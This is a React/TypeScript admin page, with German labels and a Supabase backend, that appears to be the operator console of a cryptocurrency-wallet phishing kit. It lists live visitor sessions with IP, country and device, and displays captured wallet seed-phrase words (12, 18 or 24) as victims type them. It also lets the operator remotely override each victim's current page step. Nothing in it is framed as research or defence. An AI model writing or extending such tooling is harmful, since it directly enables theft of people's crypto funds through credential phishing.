import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import type { Tables } from "@/integrations/supabase/types";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";

type Session = Tables<"sessions">;
type SeedWord = Tables<"session_seed_words">;
type EventRow = Tables<"session_events">;

const STEP_OPTIONS = ["landing", "connecting", "wizard_1", "wizard_2", "wizard_3", "seed_modal", "seed_12", "seed_18", "seed_24", "submitted"];

function isActive(s: Session) {
  const age = Date.now() - new Date(s.last_seen_at).getTime();
  return s.status === "active" && age < 60000;
}

export default function Sessions() {
  const [rows, setRows] = useState<Session[]>([]);
  const [open, setOpen] = useState<Session | null>(null);

  useEffect(() => {
    supabase
      .from("sessions")
      .select("*")
      .order("last_seen_at", { ascending: false })
      .limit(200)
      .then(({ data }) => setRows(data ?? []));

    const ch = supabase
      .channel("admin-sessions")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
        setRows((cur) => {
          if (payload.eventType === "INSERT") return [payload.new as Session, ...cur].slice(0, 200);
          if (payload.eventType === "UPDATE") {
            return cur.map((r) => (r.id === (payload.new as Session).id ? (payload.new as Session) : r));
          }
          if (payload.eventType === "DELETE") return cur.filter((r) => r.id !== (payload.old as Session).id);
          return cur;
        });
      })
      .subscribe();

    return () => {
      supabase.removeChannel(ch);
    };
  }, []);

  const sorted = [...rows].sort((a, b) => {
    const aa = isActive(a) ? 1 : 0;
    const bb = isActive(b) ? 1 : 0;
    if (aa !== bb) return bb - aa;
    return new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime();
  });

  return (
    <div className="p-6">
      <h2 className="text-2xl font-semibold mb-4">Sessions</h2>
      <Card className="overflow-hidden">
        <table className="w-full text-sm">
          <thead className="bg-muted/50">
            <tr className="text-left">
              <th className="p-3">Status</th>
              <th className="p-3">Device</th>
              <th className="p-3">Step</th>
              <th className="p-3">IP / Land</th>
              <th className="p-3">Letzter Ping</th>
              <th className="p-3">Erstellt</th>
              <th className="p-3"></th>
            </tr>
          </thead>
          <tbody>
            {sorted.map((r) => (
              <tr key={r.id} className="border-t hover:bg-muted/30">
                <td className="p-3">
                  {r.status === "submitted" ? (
                    <Badge variant="default">submitted</Badge>
                  ) : isActive(r) ? (
                    <Badge className="bg-green-600">live</Badge>
                  ) : (
                    <Badge variant="secondary">idle</Badge>
                  )}
                </td>
                <td className="p-3">{r.device ?? "—"}</td>
                <td className="p-3 font-mono text-xs">{r.step}</td>
                <td className="p-3 text-xs">
                  {r.ip ?? "—"} {r.country ? `(${r.country})` : ""}
                </td>
                <td className="p-3 text-xs">{new Date(r.last_seen_at).toLocaleTimeString()}</td>
                <td className="p-3 text-xs">{new Date(r.created_at).toLocaleString()}</td>
                <td className="p-3">
                  <Button size="sm" variant="outline" onClick={() => setOpen(r)}>Details</Button>
                </td>
              </tr>
            ))}
            {sorted.length === 0 && (
              <tr>
                <td colSpan={7} className="p-8 text-center text-muted-foreground">Noch keine Sessions.</td>
              </tr>
            )}
          </tbody>
        </table>
      </Card>

      <SessionDetail session={open} onClose={() => setOpen(null)} />
    </div>
  );
}

function SessionDetail({ session, onClose }: { session: Session | null; onClose: () => void }) {
  const [words, setWords] = useState<SeedWord[]>([]);
  const [events, setEvents] = useState<EventRow[]>([]);

  useEffect(() => {
    if (!session) {
      setWords([]);
      setEvents([]);
      return;
    }
    supabase
      .from("session_seed_words")
      .select("*")
      .eq("session_id", session.id)
      .order("position")
      .then(({ data }) => setWords(data ?? []));
    supabase
      .from("session_events")
      .select("*")
      .eq("session_id", session.id)
      .order("created_at", { ascending: false })
      .limit(50)
      .then(({ data }) => setEvents(data ?? []));

    const ch = supabase
      .channel(`session-detail-${session.id}`)
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "session_seed_words", filter: `session_id=eq.${session.id}` },
        (payload) => {
          setWords((cur) => {
            if (payload.eventType === "INSERT") {
              const row = payload.new as SeedWord;
              return [...cur.filter((w) => w.position !== row.position), row].sort((a, b) => a.position - b.position);
            }
            if (payload.eventType === "UPDATE") {
              const row = payload.new as SeedWord;
              return cur.map((w) => (w.id === row.id ? row : w)).sort((a, b) => a.position - b.position);
            }
            if (payload.eventType === "DELETE") return cur.filter((w) => w.id !== (payload.old as SeedWord).id);
            return cur;
          });
        },
      )
      .subscribe();

    return () => {
      supabase.removeChannel(ch);
    };
  }, [session]);

  async function updateStep(step: string) {
    if (!session) return;
    const { error } = await supabase.from("sessions").update({ step }).eq("id", session.id);
    if (error) toast.error(error.message);
    else toast.success(`Step gesetzt: ${step}`);
  }

  const seedLen = session?.seed_length ?? Math.max(words.length, 12);
  const slots = Array.from({ length: seedLen }, (_, i) => words.find((w) => w.position === i + 1));

  return (
    <Dialog open={!!session} onOpenChange={(o) => !o && onClose()}>
      <DialogContent className="max-w-3xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle>Session Details</DialogTitle>
        </DialogHeader>
        {session && (
          <div className="space-y-6">
            <div className="grid grid-cols-2 gap-3 text-sm">
              <div><span className="text-muted-foreground">Device:</span> {session.device ?? "—"}</div>
              <div><span className="text-muted-foreground">Status:</span> {session.status}</div>
              <div><span className="text-muted-foreground">IP:</span> {session.ip ?? "—"}</div>
              <div><span className="text-muted-foreground">Land:</span> {session.country ?? "—"}</div>
              <div className="col-span-2 truncate"><span className="text-muted-foreground">UA:</span> {session.user_agent ?? "—"}</div>
            </div>

            <div className="flex items-center gap-3">
              <span className="text-sm text-muted-foreground">Step überschreiben:</span>
              <Select value={session.step} onValueChange={updateStep}>
                <SelectTrigger className="w-52"><SelectValue /></SelectTrigger>
                <SelectContent>
                  {STEP_OPTIONS.map((s) => <SelectItem key={s} value={s}>{s}</SelectItem>)}
                </SelectContent>
              </Select>
            </div>

            <div>
              <h4 className="font-semibold mb-2">Seed-Wörter ({words.length}/{seedLen})</h4>
              <div className="grid grid-cols-3 gap-2 sm:grid-cols-4">
                {slots.map((w, i) => (
                  <div key={i} className="border rounded px-2 py-1.5 text-sm">
                    <span className="text-xs text-muted-foreground mr-1">{i + 1}.</span>
                    <span className="font-mono">{w?.word || "—"}</span>
                  </div>
                ))}
              </div>
            </div>

            <div>
              <h4 className="font-semibold mb-2">Events</h4>
              <div className="space-y-1 max-h-48 overflow-y-auto text-xs font-mono">
                {events.map((e) => (
                  <div key={e.id} className="flex gap-2">
                    <span className="text-muted-foreground">{new Date(e.created_at).toLocaleTimeString()}</span>
                    <span className="font-semibold">{e.event_type}</span>
                    <span className="text-muted-foreground truncate">{JSON.stringify(e.payload)}</span>
                  </div>
                ))}
                {events.length === 0 && <div className="text-muted-foreground">Keine Events.</div>}
              </div>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
